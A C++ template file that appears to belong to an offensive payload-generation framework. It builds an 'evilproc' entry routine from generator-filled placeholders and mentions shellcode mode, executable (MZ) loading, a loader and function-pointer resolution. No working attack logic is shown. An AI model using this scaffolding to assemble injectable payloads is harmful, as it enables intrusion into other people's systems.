/* evilproc.cpp is  COPY,  NOT HARDLINK */
// Mechanism:
// EVILPROC_TEMPLATE.cpp -> EVPGen(1)   -> PG(2)  ->  src/evilproc.cpp
//
// The structure of this file:
// %%% USERCODE_DEFS %%%      < filled by EVPGen(1), can be counted be PG.
//                                                   MZ loading commands,
//                                                   other module's commands
//
// #ifdef __PG_ENABLED_
//   // %%% pg_procs           < filled by PG(2) (generated procs)
//     // %%% pg_main_lines    <                 (root proc's lines)
// #else
//     %%% USERCODE_LINES %%%   < filled by EVPGen(1), trivial; simply calls every item of USERCODE_DEFS

//@@@headers
//%%%pg_includes?
#include "pay.h"
#include "ae.h"
#include "locate.h"
#include "alloc.h"
#include "lpfns.h"
#include "evil_common.h"
#include "dbg.h"

#include "evilproc.h"
//@@@endheaders

#ifndef PAYLOAD_SHELLCODE
//@@@headers
#include "ldr.h"
//@@@endheaders
#endif

//number of usercodes is detected by counting lines
//@@@privdefs
%%%USERCODE_DEFS%%%
//@@@endprivdefs


static SPRAYABLE_PROC(prepare) {
  //@@@proc /name prepare
  DBGINIT(); _CALL(common_init); dbgprn("common_init() done\n");
  _CALL(lpfns_resolve);
  CUR_RETD = 1;
  //@@@endproc
}


//%%%pg_procs


EVILPROC_DECL() {
  EVILPROC_PRE();
  //@@@proc /root yes /decl EVILPROC

#ifdef __PG_ENABLED_
  //%%%pg_main_lines
#else
%%%USERCODE_LINES%%%
#endif

  //@@@endproc
  EVILPROC_POST();
}
